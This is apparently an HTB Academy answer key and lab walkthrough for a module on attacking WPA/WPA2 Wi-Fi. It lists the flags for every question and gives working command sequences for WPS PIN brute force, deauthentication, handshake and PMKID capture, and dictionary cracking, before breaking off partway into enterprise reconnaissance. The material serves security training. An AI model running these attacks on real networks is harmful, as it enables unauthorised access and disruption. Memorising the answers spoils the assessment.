
| Section                                               | Question Number | Answer                                                           |
| ----------------------------------------------------- | --------------- | ---------------------------------------------------------------- |
| WPA Personal Overview                                 | Question 1      | f39df1562db5378e44694898e0fbda8482068ef1b3e368b46cbaeb381df307cd |
| Reconnaissance and Bruteforce                         | Question 1      | 42b5215eb129abec043d7f32596f4f90                                 |
| Cracking MIC (4-Way Handshake)                        | Question 1      | basketball                                                       |
| Cracking MIC (4-Way Handshake)                        | Question 2      | HTB{H@ck3R\_M@n}                                                 |
| PMKID Attack                                          | Question 1      | 5ec1e2effa2da684c8925b9a86cea90d15a5de70                         |
| PMKID Attack                                          | Question 2      | minecraft                                                        |
| WPA Enterprise Reconnaissance                         | Question 1      | HTB\\Sentinal                                                    |
| WPA Enterprise Reconnaissance                         | Question 2      | Yes                                                              |
| Performing Bruteforce Attacks                         | Question 1      | sunshine                                                         |
| Performing Bruteforce Attacks                         | Question 2      | HTB\\jason                                                       |
| EAP Downgrade Attack (Attacking)                      | Question 1      | V3ryV3ryStR0nGP2300W0rd                                          |
| EAP Downgrade Attack (Attacking)                      | Question 2      | HTB{F0rce\_DownGR2d3\_AttacK}                                    |
| Enterprise Evil-Twin Attack                           | Question 1      | HTB\\Sentinal.Jr                                                 |
| Enterprise Evil-Twin Attack                           | Question 2      | september                                                        |
| Enterprise Evil-Twin Attack                           | Question 3      | HTB{CapTuR3\_MSChap}                                             |
| PEAP Relay Attack                                     | Question 1      | HTB{P3@P\_R3lAY\_!s\_Aw3S0me}                                    |
| Attacking EAP-TLS Authentication                      | Question 1      | Beast                                                            |
| Attacking EAP-TLS Authentication                      | Question 2      | S3ntinal\_123                                                    |
| Cracking EAP-MD5                                      | Question 1      | x3dnesse                                                         |
| Cracking EAP-MD5                                      | Question 2      | shadow                                                           |
| Cracking EAP-MD5                                      | Question 3      | HTB{Cr@ck!ng\_MD5\_1$\_3asY}                                     |
| Attacking WPA/WPA2 Wi-Fi Networks - Skills Assessment | Question 1      | SLH\\Sentinal                                                    |
| Attacking WPA/WPA2 Wi-Fi Networks - Skills Assessment | Question 2      | HTB{Brut3ForCing\_is\_FuN}                                       |
| Attacking WPA/WPA2 Wi-Fi Networks - Skills Assessment | Question 3      | spongebob                                                        |
| Attacking WPA/WPA2 Wi-Fi Networks - Skills Assessment | Question 4      | HTB{Wp@\_Psk\_C0mpromis3d}                                       |
| Attacking WPA/WPA2 Wi-Fi Networks - Skills Assessment | Question 5      | SLH\\Administrator                                               |
| Attacking WPA/WPA2 Wi-Fi Networks - Skills Assessment | Question 6      | HTB{R3laying\_!s\_Fun}                                           |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# WPA Personal Overview

## Question 1

### "Run the Python script shown for the construction of the Pairwise Master Key (PMK). If the SSID is set to "HTB-Wireless" and the PSK is set to "HackTheBox", what will the value of the First Pairwise Master Key be?"

Students will reuse the Python3 script from the `Construction of the Pairwise Master Key (PMK)` portion of the section, and they will alter the preset `SSID` value to `HTB-Wireless` and the `PSK` value to `HackTheBox`:

Code: python

```python
import hashlib
import os, binascii

#This script generates two novel PMKs using 4096 iterations, with a pre-defined SSID and two different PSKs.
#It then prints out both generated Pairwise Master Keys, as you can see they are different.

SSID = "HTB-Wireless"
PSK = "HackTheBox"
PSKB = "supersecurepassphrase"
print("Wireless Network Name: " + SSID)
print ("--------------------------------------------")

#This is the bread and butter of the derivation. As seen, it uses HMAC-SHA1, the PSK, SSID, 4096 iterations, and 32-byte (256-bit) length.
PMK = hashlib.pbkdf2_hmac('sha1', bytes(PSK, 'utf-8'), bytes(SSID, 'utf-8'), 4096, 32)
PMKB = hashlib.pbkdf2_hmac('sha1', bytes(PSKB, 'utf-8'), bytes(SSID, 'utf-8'), 4096, 32)

#This converts the generated PMKs.
Readable_PMK = binascii.hexlify(PMK)
Readable_PMKB = binascii.hexlify(PMKB)

#Finally to see the bytes-object of our PMK :)
print ("First Pairwise Master Key:" + str(Readable_PMK) + "\n Real PSK: " + PSK)
print ("Second Pairwise Master Key: " + str(Readable_PMKB) + "\n Real PSK:" + PSKB)
```

Subsequently, students will execute the script and will obtain the value of the `First Pairwise Master Key`:

Code: shell

```shell
python3 PMKPoc-Student.py
```

```
┌─[us-academy-4]─[10.10.14.115]─[htb-ac-8414@htb-0lfxiwvzym]─[~]
└──╼ [★]$ python3 PMKPoc-Student.py 

Wireless Network Name: HTB-Wireless
--------------------------------------------
First Pairwise Master Key:b'{hidden}'
 Real PSK: HackTheBox
Second Pairwise Master Key: b'e089b588083b216372bf1889e93f8fe9b57d4a500cf831064d04228e4031c42c'
 Real PSK:supersecurepassphrase
```

Answer: `f39df1562db5378e44694898e0fbda8482068ef1b3e368b46cbaeb381df307cd`

# Reconnaissance and Bruteforce

## Question 1

### "Perform the WPS brute-force attack as demonstrated in this section. What is the discovered value of the WPA PSK?"

After spawning the target, students will proceed to establish an RDP connection using the credentials `wifi:wifi`:

Code: shell

```shell
xfreerdp /v:STMIP /u:wifi /p:wifi /dynamic-resolution
```

```
┌─[eu-academy-6]─[10.10.14.121]─[htb-ac-8414@htb-kx4xhf8d4g]─[~]
└──╼ [★]$ xfreerdp /v:10.129.231.149 /u:wifi /p:wifi /dynamic-resolution 

[02:42:12:266] [8782:8783] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Central
[02:42:12:567] [8782:8783] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[02:42:12:567] [8782:8783] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[02:42:13:588] [8782:8783] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[02:42:13:588] [8782:8783] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[02:42:13:588] [8782:8783] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
```

Students will open a terminal and switch to the root's user context:

Code: shell

```shell
sudo -s
```

```
wifi@WiFiIntro:~$ sudo -s
```

Next, they will enable monitor mode on the `wlan0` interface using `airmon-ng`:

Code: shell

```shell
sudo airmon-ng start wlan0
```

```
root@WiFiIntro:/home/wifi# sudo airmon-ng start wlan0

Found 4 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    185 avahi-daemon
    201 wpa_supplicant
    209 avahi-daemon
    219 NetworkManager

PHY	Interface	Driver		Chipset

phy1	wlan0		htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211

		(mac80211 monitor mode vif enabled for [phy1]wlan0 on [phy1]wlan0mon)
		(mac80211 station mode vif disabled for [phy1]wlan0)
```

Having enabled the monitor mode on the `wlan0` (`wlan0mon`) interface, students will use `airodump-ng` to enumerate access points in the network, including their BSSIDs, channels, and ESSIDs, and take a note of them.

Code: shell

```shell
airodump-ng wlan0mon
```

```
root@WiFiIntro:/home/wifi# airodump-ng wlan0mon

 CH 13 ][ Elapsed: 6 s ][ 2025-01-07 08:47 

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 D8:D6:3D:EB:29:D5  -47       10        0    0   1   54   WPA2 CCMP   PSK  HackTheWireless                                                                                                                        

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
```

Subsequently, students will terminate the `airodump-ng` process with the key combination `Ctrl + C`. They will start another one where they will display the WPS-related information of the access point using the `--wps` option and specifying the channel (`1`):

Code: shell

```shell
sudo airodump-ng wlan0mon -c 1 --wps
```

```
root@WiFiIntro:/home/wifi# sudo airodump-ng wlan0mon -c 1 --wps

CH  1 ][ Elapsed: 0 s ][ 2025-01-07 08:51 

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH WPS                    ESSID

 D8:D6:3D:EB:29:D5  -47 100       52        0    0   1   54   WPA2 CCMP   PSK  2.0 LAB,DISP,PBC,KPAD  HackTheWireless                                                                                             

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
```

Students will have verified the use of `WPS` on the access point. Subsequently, they will proceed to terminate the `airodump-ng` process and stop the monitor mode on the `wlan0mon` interface using `airmon-ng`, and are going to create a new interface `mon0`, which will be in monitor mode:

Code: shell

```shell
airmon-ng stop wlan0mon
iw dev wlan0 interface add mon0 type monitor
ifconfig mon0 up
```

```
root@WiFiIntro:/home/wifi# airmon-ng stop wlan0mon

PHY	Interface	Driver		Chipset

phy1	wlan0mon	htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211

		(mac80211 station mode vif enabled on [phy1]wlan0)

		(mac80211 monitor mode vif disabled for [phy1]wlan0mon)
		
root@WiFiIntro:/home/wifi# iw dev wlan0 interface add mon0 type monitor
root@WiFiIntro:/home/wifi# ifconfig mon0 up
```

Next, students will perform a WPS brute-force attack using `reaver` with the `mon0` interface, the channel and the BSSID of the `HackTheWireless` network to obtain the value of WPA PSK:

Code: shell

```shell
reaver -i mon0 -c 1 -b D8:D6:3D:EB:29:D5
```

```
root@WiFiIntro:/home/wifi# reaver -i mon0 -c 1 -b D8:D6:3D:EB:29:D5

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Waiting for beacon from D8:D6:3D:EB:29:D5
[+] Received beacon from D8:D6:3D:EB:29:D5
[!] Found packet with bad FCS, skipping...
[+] Associated with D8:D6:3D:EB:29:D5 (ESSID: HackTheWireless)
[+] WPS PIN: '12345670'
[+] WPA PSK: '{hidden}'
[+] AP SSID: 'HackTheWireless'
```

Answer: `42b5215eb129abec043d7f32596f4f90`

# Cracking MIC (4-Way Handshake)

## Question 1

### "Perform the 4-way handshake capture as demonstrated in this section. What is the discovered value of the WPA PSK?"

After spawning the target, students will proceed to establish an RDP connection using the credentials `wifi:wifi`:

Code: shell

```shell
xfreerdp /v:STMIP /u:wifi /p:wifi /dynamic-resolution
```

```
┌─[eu-academy-6]─[10.10.14.121]─[htb-ac-8414@htb-rzdvfchclb]─[~]
└──╼ [★]$ xfreerdp /v:10.129.160.80 /u:wifi /p:wifi /dynamic-resolution 

[03:57:56:352] [7988:7989] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Central
[03:57:56:653] [7988:7989] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[03:57:56:653] [7988:7989] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[03:57:56:672] [7988:7989] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[03:57:56:672] [7988:7989] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[03:57:56:672] [7988:7989] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
```

Students will open a terminal and switch to the root's user context:

Code: shell

```shell
sudo -s
```

```
wifi@WiFiIntro:~$ sudo -s
```

Next, they will enable monitor mode on the `wlan0` interface using `airmon-ng`:

Code: shell

```shell
sudo airmon-ng start wlan0
```

```
root@WiFiIntro:/home/wifi# sudo airmon-ng start wlan0

Found 4 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    185 avahi-daemon
    201 wpa_supplicant
    209 avahi-daemon
    219 NetworkManager

PHY	Interface	Driver		Chipset

phy1	wlan0		htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211

		(mac80211 monitor mode vif enabled for [phy1]wlan0 on [phy1]wlan0mon)
		(mac80211 station mode vif disabled for [phy1]wlan0)
```

Having enabled the monitor mode on the `wlan0` (`wlan0mon`) interface, students will proceed to use `airodump-ng` on channel 1 and save the traffic to a file:

Code: shell

```shell
airodump-ng wlan0mon -c 1 -w AcademyStudent
```

```
root@WiFiIntro:/home/wifi# airodump-ng wlan0mon -c 1 -w AcademyStudent
10:00:53  Created capture file "AcademyStudent-01.cap".

 CH  1 ][ Elapsed: 36 s ][ 2025-01-07 10:01 

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 D8:D6:3D:EB:29:D5  -47 100      384        0    0   1   54   WPA2 CCMP   PSK  HackMe                                            

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 D8:D6:3D:EB:29:D5  E6:40:90:8C:AB:1E  -29    0 - 1      0        1         HackMe   
```

Students will open another terminal/tab, switch to the root user, and perform a deauthentication attack using `aireplay-ng` and the found BSSIDs of both the access point (`HackMe`) and the client. Note the client's BSSID (MAC address) is subject to change upon spawn/reset of the target.

Code: shell

```shell
sudo -s
aireplay-ng -0 5 -a D8:D6:3D:EB:29:D5 -c E6:40:90:8C:AB:1E wlan0mon
```

```
wifi@WiFiIntro:~$ sudo -s
root@WiFiIntro:/home/wifi# aireplay-ng -0 5 -a D8:D6:3D:EB:29:D5 -c E6:40:90:8C:AB:1E wlan0mon

10:04:31  Waiting for beacon frame (BSSID: D8:D6:3D:EB:29:D5) on channel 1
10:04:31  Sending 64 directed DeAuth (code 7). STMAC: [E6:40:90:8C:AB:1E] [ 0| 0 ACKs]
10:04:32  Sending 64 directed DeAuth (code 7). STMAC: [E6:40:90:8C:AB:1E] [ 0| 0 ACKs]
10:04:32  Sending 64 directed DeAuth (code 7). STMAC: [E6:40:90:8C:AB:1E] [ 0| 0 ACKs]
10:04:33  Sending 64 directed DeAuth (code 7). STMAC: [E6:40:90:8C:AB:1E] [ 0| 0 ACKs]
10:04:34  Sending 64 directed DeAuth (code 7). STMAC: [E6:40:90:8C:AB:1E] [ 0| 0 ACKs]
```

Students will return to the terminal window of `airodump-ng` and are going to notice the captured WPA handshake. Subsequently, they will terminate the process with the key combination `Ctrl + C`:

```
root@WiFiIntro:/home/wifi# airodump-ng wlan0mon -c 1 -w AcademyStudent
10:01:55  Created capture file "AcademyStudent-01.cap".

CH  1 ][ Elapsed: 3 mins ][ 2025-01-07 10:05 ][ WPA handshake: D8:D6:3D:EB:29:D5 

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 D8:D6:3D:EB:29:D5  -47   0     1894       10    0   1   54   WPA2 CCMP   PSK  HackMe                                            

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 D8:D6:3D:EB:29:D5  E6:40:90:8C:AB:1E  -29    1 - 1      0      660  EAPOL  HackMe   
```

Next, students will use `cowpatty` to verify the successful capture of the handshake by specifying the `AcademyStudent-01.cap` file, the `-c` option to check for valid 4-way frames, and the `-r` option to specify the packet capture file:

Code: shell

```shell
cowpatty -c -r AcademyStudent-01.cap
```

```
root@WiFiIntro:/home/wifi# cowpatty -c -r AcademyStudent-01.cap

cowpatty 4.8 - WPA-PSK dictionary attack. <jwright@hasborg.com>

Collected all necessary data to mount crack against WPA2/PSK passphrase.
```

Students will proceed to crack the 4-way handshake using `cowpatty` by specifying the packet capture (`AcademyStudent-01.cap`), the dictionary wordlist using the `-f` option located at `/opt/wordlist.txt`, and the ESSID obtained earlier using the `-s` option to obtain the PSK:

Code: shell

```shell
cowpatty -r AcademyStudent-01.cap -f /opt/wordlist.txt -s HackMe
```

```
root@WiFiIntro:/home/wifi# cowpatty -r AcademyStudent-01.cap -f /opt/wordlist.txt -s HackMe

cowpatty 4.8 - WPA-PSK dictionary attack. <jwright@hasborg.com>

Collected all necessary data to mount crack against WPA2/PSK passphrase.
Starting dictionary attack.  Please be patient.

The PSK is "{hidden}".

18 passphrases tested in 0.03 seconds:  516.96 passphrases/second
```

Answer: `basketball`

# Cracking MIC (4-Way Handshake)

## Question 2

### "Use the obtained WPA PSK to connect to the Wi-Fi network. What is the value of the flag located at 192.168.1.1?"

Students will reuse the previously established RDP session and are going to disable the monitor mode of the `wlan0` (`wlan0mon`) interface using `airmon-ng`:

Code: shell

```shell
sudo airmon-ng stop wlan0mon
```

```
root@WiFiIntro:/home/wifi# sudo airmon-ng stop wlan0mon

PHY	Interface	Driver		Chipset

phy1	wlan0mon	htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211

		(mac80211 station mode vif enabled on [phy1]wlan0)

		(mac80211 monitor mode vif disabled for [phy1]wlan0mon)
```

Next, students will create a config file, which they are going to use to connect to the access point (`HackMe`) using the previously found Pre-Shared Key value:

Code: shell

```shell
cat << EOF > wpa.conf
network={
    ssid="HackMe"
    psk="{hidden}"
}
EOF
```

```
root@WiFiIntro:/home/wifi# cat << EOF > wpa.conf
network={
    ssid="HackMe"
    psk="{hidden}"
}
EOF
```

Students will use `wpa_supplicant` and the `wpa.conf` file to connect to the access point using the `wlan0` interface:

Code: shell

```shell
sudo wpa_supplicant -c wpa.conf -i wlan0
```

```
root@WiFiIntro:/home/wifi# sudo wpa_supplicant -c wpa.conf -i wlan0

Successfully initialized wpa_supplicant
rfkill: Cannot open RFKILL control device
rfkill: Cannot get wiphy information
nl80211: Could not set interface 'p2p-dev-wlan0' UP
nl80211: deinit ifname=p2p-dev-wlan0 disabled_11b_rates=0
p2p-dev-wlan0: Failed to initialize driver interface
p2p-dev-wlan0: CTRL-EVENT-DSCP-POLICY clear_all
P2P: Failed to enable P2P Device interface
wlan0: SME: Trying to authenticate with d8:d6:3d:eb:29:d5 (SSID='HackMe' freq=2412 MHz)
wlan0: Trying to associate with d8:d6:3d:eb:29:d5 (SSID='HackMe' freq=2412 MHz)
wlan0: Associated with d8:d6:3d:eb:29:d5
wlan0: CTRL-EVENT-SUBNET-STATUS-UPDATE status=0
wlan0: WPA: Key negotiation completed with d8:d6:3d:eb:29:d5 [PTK=CCMP GTK=CCMP]
wlan0: CTRL-EVENT-CONNECTED - Connection to d8:d6:3d:eb:29:d5 completed [id=0 id_str=]
```

In another terminal, students will use `dhclient` to obtain an IP address from the access point on the `wlan0` interface:

Code: shell

```shell
sudo dhclient wlan0
```

```
root@WiFiIntro:/home/wifi# sudo dhclient wlan0
```

Subsequently, students will use `wget` to obtain the flag from the `192.168.1.1` IP address:

Code: shell

```shell
wget http://192.168.1.1
cat index.html
```

```
root@WiFiIntro:/home/wifi# wget http://192.168.1.1

--2025-01-07 10:19:08--  http://192.168.1.1/
Connecting to 192.168.1.1:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16 [text/html]
Saving to: ‘index.html’

index.html          100%[===================>]      16  --.-KB/s    in 0s      

2025-01-07 10:19:08 (1.81 MB/s) - ‘index.html’ saved [16/16]

root@WiFiIntro:/home/wifi# cat index.html 
{hidden}
```

Answer: `HTB{H@ck3R_M@n}`

# PMKID Attack

## Question 1

### "Run the Python script shown for the construction of the PMKID. If the ESSID is set to "HTB-Wireless" and the PSK is set to "SecurePassword", what will the value of the PMKID be?"

After spawning the target, students will proceed to establish an RDP connection using the credentials `wifi:wifi`:

Code: shell

```shell
xfreerdp /v:STMIP /u:wifi /p:wifi /dynamic-resolution
```

```
┌─[eu-academy-6]─[10.10.14.121]─[htb-ac-8414@htb-mues8nbp7e]─[~]
└──╼ [★]$ xfreerdp /v:10.129.60.196 /u:wifi /p:wifi /dynamic-resolution 

[05:23:42:663] [6827:6828] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Central
[05:23:42:964] [6827:6828] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[05:23:42:964] [6827:6828] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[05:23:42:977] [6827:6828] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[05:23:42:977] [6827:6828] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[05:23:42:977] [6827:6828] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
```

Students will reuse the Python3 script in the `How the PMKID is computed?` portion of the section and are going to add the appropriate value in the `PSK` variable (`SecurePassword`):

Code: python

```python
from pbkdf2 import PBKDF2
import binascii, hmac, hashlib, codecs

#First we need to declare the PSK and ESSID
PSK = 'SecurePassword'
ESSID = 'HTB-Wireless'

#Taking in the MAC addresses and converting to hex
APMac = '00:ca:12:11:12:13' #Access Point MAC Address
StMac = '00:ca:12:12:13:14' #Station MAC Address
#Removes :, converts to binary, then converts to hexadecimal
APMachex = binascii.hexlify(binascii.unhexlify(APMac.replace(':', '')))
StMachex = binascii.hexlify(binascii.unhexlify(StMac.replace(':', '')))

#Declares our message for the PMKID calculation
message = "PMK Name" + str(APMachex) + str(StMachex)

#Calculation of the PMK
pmk = PBKDF2(PSK, ESSID, 4096).read(32)

#Then we calculate the PMKID, we do so with hmac. The general syntax is hmac(key, msg,digestmod)
pmkid = hmac.new(pmk, message.encode('utf-8'), hashlib.sha1).hexdigest()

#This portion simply prints everything.
print("Basic PMKID Calculator")
print('Access Point Mac | ' + APMac + ' | ' + str(APMachex))
print('Station MAC | ' + StMac + ' | ' + str(StMachex))
print('Message: ' + str(message))
print('PMK: ' + str(pmk))
print('PMKID: ' + str(pmkid))
```

Students will run the Python3 script to attain the value of the PMKID:

Code: shell

```shell
python3 student_pmkid.py
```

```
wifi@WiFiIntro:~$ python3 student_pmkid.py 

Basic PMKID Calculator
Access Point Mac | 00:ca:12:11:12:13 | b'00ca12111213'
Station MAC | 00:ca:12:12:13:14 | b'00ca12121314'
Message: PMK Nameb'00ca12111213'b'00ca12121314'
PMK: b'\xc4\xb93\xc9>\xecOV\x93&\x8dX)\x84\xe0\t\xa1n\x9b\xcd\xa5\x96\xd8\xd2;\xe7\x01!\xde\xf5FX'
PMKID: {hidden}
```

Answer: `5ec1e2effa2da684c8925b9a86cea90d15a5de70`

# PMKID Attack

## Question 2

### "Perform the PMKID capture as demonstrated in this section. What is the discovered value of the WPA PSK?"

Students will reuse the previously established RDP session and will elevate to the `root` user:

Code: shell

```shell
sudo -s
```

```
wifi@WiFiIntro:~$ sudo -s
```

Next, students will enable monitor mode on the `wlan0` interface using `airmon-ng`:

Code: shell

```shell
sudo airmon-ng start wlan0
```

```
root@WiFiIntro:/home/wifi# sudo airmon-ng start wlan0

Found 4 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    185 avahi-daemon
    206 wpa_supplicant
    213 avahi-daemon
    225 NetworkManager

PHY	Interface	Driver		Chipset

phy1	wlan0		htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211

		(mac80211 monitor mode vif enabled for [phy1]wlan0 on [phy1]wlan0mon)
		(mac80211 station mode vif disabled for [phy1]wlan0)
```

Subsequently, students will use the `wlan0mon` interface using `hcxdumptool` to scan for networks with PMKID using the `--enable_status=3`:

Code: shell

```shell
hcxdumptool -i wlan0mon --enable_status=3
```

```
root@WiFiIntro:/home/wifi# hcxdumptool -i wlan0mon --enable_status=3

initialization of hcxdumptool 6.2.5...
warning possible interfere: NetworkManager is running with pid 225

warning possible interfere: wpa_supplicant is running with pid 206

interface is already in monitor mode, skipping ioctl(SIOCSIWMODE) and ioctl(SIOCSIFFLAGS) system calls

start capturing (stop with ctrl+c)
NMEA 0183 SENTENCE........: N/A
INTERFACE NAME............: wlan0mon

<SNIP>

11:41:25 2412/1   4ae787e8b085 d8d63deb29d5 HTB [ASSOCIATION]
11:41:25 2412/1   4ae787e8b085 d8d63deb29d5 HTB [PMKID:8f71363949db31937750068cd38a7382 KDV:2]
11:41:25 2412/1   4ae787e8b085 d8d63deb29d5 HTB [EAPOL:M1M2 EAPOLTIME:6605 RC:1 KDV:2]
11:41:25 2412/1   4ae787e8b085 d8d63deb29d5 HTB [EAPOL:M2M3 EAPOLTIME:106 RC:2 KDV:2]
11:41:25 2412/1   4ae787e8b085 d8d63deb29d5 HTB [EAPOL:M3M4ZEROED EAPOLTIME:117 RC:2 KDV:2]
```

They will stop the `hcxdumptool` process using the key combination `Ctrl + C` and will proceed to obtain the BSSID using the captured ESSID of `HTB` using `airodump-ng` and the `--essid` option:

Code: shell

```shell
sudo airodump-ng wlan0mon --essid HTB
```

```
root@WiFiIntro:/home/wifi# sudo airodump-ng wlan0mon --essid HTB

 CH 13 ][ Elapsed: 0 s ][ 2025-01-07 11:44 

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 D8:D6:3D:EB:29:D5  -47        5        0    0   1   54   WPA2 CCMP   PSK  HTB                                                                 

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
```

Students will stop the `airodump-ng` process using the key combination `Ctrl + C` and will use `hcxdumptool` to capture the PMKID of the `HTB` network by using the previously attained BSSID and specifying it in the `--filterlist_ap` option and save it to a file:

Code: shell

```shell
hcxdumptool -i wlan0mon --enable_status=3 --filterlist_ap=D8:D6:3D:EB:29:D5 --filtermode=2 -o HTBStudent.pcap
```

```
root@WiFiIntro:/home/wifi# hcxdumptool -i wlan0mon --enable_status=3 --filterlist_ap=D8:D6:3D:EB:29:D5 --filtermode=2 -o HTBStudent.pcap

initialization of hcxdumptool 6.2.5...
warning possible interfere: NetworkManager is running with pid 225

warning possible interfere: wpa_supplicant is running with pid 206

interface is already in monitor mode, skipping ioctl(SIOCSIWMODE) and ioctl(SIOCSIFFLAGS) system calls

start capturing (stop with ctrl+c)
NMEA 0183 SENTENCE........: N/A
INTERFACE NAME............: wlan0mon

<SNIP>

11:47:16 2417/2   4ae787e8b085 d8d63deb29d5 HTB [PMKID:8f71363949db31937750068cd38a7382 KDV:2]
11:47:16 2417/2   4ae787e8b085 d8d63deb29d5 HTB [EAPOL:M1M2 EAPOLTIME:6389 RC:1 KDV:2]
11:47:16 2417/2   4ae787e8b085 d8d63deb29d5 HTB [EAPOL:M2M3 EAPOLTIME:154 RC:2 KDV:2]
11:47:16 2417/2   4ae787e8b085 d8d63deb29d5 HTB [EAPOL:M3M4ZEROED EAPOLTIME:79 RC:2 KDV:2]
```

Subsequently, students will stop the capture with the key combination `Ctrl + C`. They will use `hcxpcapngtool` to convert the packet capture (`HTBStudent.pcap`) to a hash:

Code: shell

```shell
hcxpcapngtool -o hash HTBStudent.pcap
```

```
root@WiFiIntro:/home/wifi# hcxpcapngtool -o hash HTBStudent.pcap

hcxpcapngtool 6.2.5 reading from HTBStudent.pcap...

summary capture file
--------------------
file name................................: HTBStudent.pcap
version (pcapng).........................: 1.0
operating system.........................: Linux 5.4.0-88-generic
application..............................: hcxdumptool 6.2.5
interface name...........................: wlan0mon

<SNIP>

session summary
---------------
processed pcapng files................: 1
```

Next, students will crack the hash using `hashcat` and mode `22000` using the dictionary wordlist located in the `/opt/wordlist.txt` directory:

Code: shell

```shell
hashcat -m 22000 --force hash /opt/wordlist.txt
```

```
root@WiFiIntro:/home/wifi# hashcat -m 22000 --force hash /opt/wordlist.txt

hashcat (v6.2.5) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-AMD EPYC 7513 32-Core Processor, 1433/2930 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 8
Maximum password length supported by kernel: 63

INFO: All hashes found in potfile! Use --show to display them.

Started: Tue Jan  7 11:53:22 2025
Stopped: Tue Jan  7 11:53:23 2025
```

Students will then use the `--show` option in `hashcat` to obtain the value of the WPA PSK:

Code: shell

```shell
hashcat -m 22000 --force hash /opt/wordlist.txt --show
```

```
root@WiFiIntro:/home/wifi# hashcat -m 22000 --force hash /opt/wordlist.txt --show

8f71363949db31937750068cd38a7382:d8d63deb29d5:4ae787e8b085:HTB:{hidden}
5a7bae85e5e210b9bffaa3719e2971f0:d8d63deb29d5:4ae787e8b085:HTB:{hidden}
```

Answer: `minecraft`

# WPA Enterprise Reconnaissance

## Question 1

### "Perform the enumeration as demonstrated in this section to find the Domain and Username. What is the name of the user connected to the WiFi network? (Format: Domain\\Username)"

After spawning the target, students will proceed to establish an RDP connection using the credentials `wifi:wifi`:

Code: shell

```shell
xfreerdp /v:STMIP /u:wifi /p:wifi /dynamic-resolution
```

```
┌─[eu-academy-6]─[10.10.14.121]─[htb-ac-8414@htb-fi4xdznvxo]─[~]
└──╼ [★]$ xfreerdp /v:10.129.169.249 /u:wifi /p:wifi /dynamic-resolution

[01:36:05:513] [180419:180444] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Central
[01:36:05:814] [180419:180444] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[01:36:05:814] [180419:180444] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[01:36:05:844] [180419:180444] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[01:36:05:850] [180419:180444] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[01:36:05:850] [180419:180444] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
```

Students will open a terminal and switch to the root's user context:

Code: shell

```shell
sudo -s
```

```
wifi@WiFiIntro:~$ sudo -s
```

Next, they will enable monitor mode on the `wlan0` interface using `airmon-ng`:

Code: shell

```shell
sudo airmon-ng start wlan0
